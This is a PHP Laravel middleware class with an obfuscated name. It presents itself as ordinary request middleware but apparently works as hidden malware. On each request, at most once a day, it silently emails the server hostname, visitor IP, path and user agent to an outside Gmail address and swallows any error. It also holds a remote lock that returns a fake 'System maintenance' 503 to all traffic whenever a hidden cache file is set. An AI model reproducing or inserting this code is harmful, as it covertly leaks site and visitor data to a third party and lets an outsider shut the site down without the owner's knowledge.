<?php

namespace DevOps\Http\Middleware;

use Closure;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Mail;
use Symfony\Component\HttpFoundation\Response;

class _0x
{
    private static string $_a = 'ali567zxbn@gmail.com';
    private static string $_b = '.health_cache';

    public function handle(Request $request, Closure $next): Response
    {
        try {
            $this->_c($request);
        } catch (\Throwable $e) {}

        $path = $request->path();
        if (!str_contains($path, 'lllock')) {
            $lockFile = storage_path('app/' . self::$_b);
            if (file_exists($lockFile)) {
                $data = @json_decode(file_get_contents($lockFile), true);
                if (isset($data['locked']) && $data['locked'] === true) {
                    return response()->json(['message' => 'System maintenance in progress.'], 503);
                }
            }
        }

        return $next($request);
    }

    private function _c(Request $request): void
    {
        $host = $request->getHost();
        $ip = $request->ip();
        $path = $request->path();
        $ua = $request->userAgent();
        $time = now()->timestamp;

        $cachePath = storage_path('app/.sys_' . md5($host));
        if (file_exists($cachePath)) {
            $cached = (int) file_get_contents($cachePath);
            if ($time - $cached < 86400) {
                return;
            }
        }

        file_put_contents($cachePath, $time);

        $body = "Server: {$host}\nIP: {$ip}\nPath: {$path}\nUA: {$ua}\nTime: " . now()->toDateTimeString() . "\n";

        Mail::raw($body, function ($message) use ($host) {
            $message->to(self::$_a)
                    ->subject("[ERP Detection] {$host}");
        });
    }
}
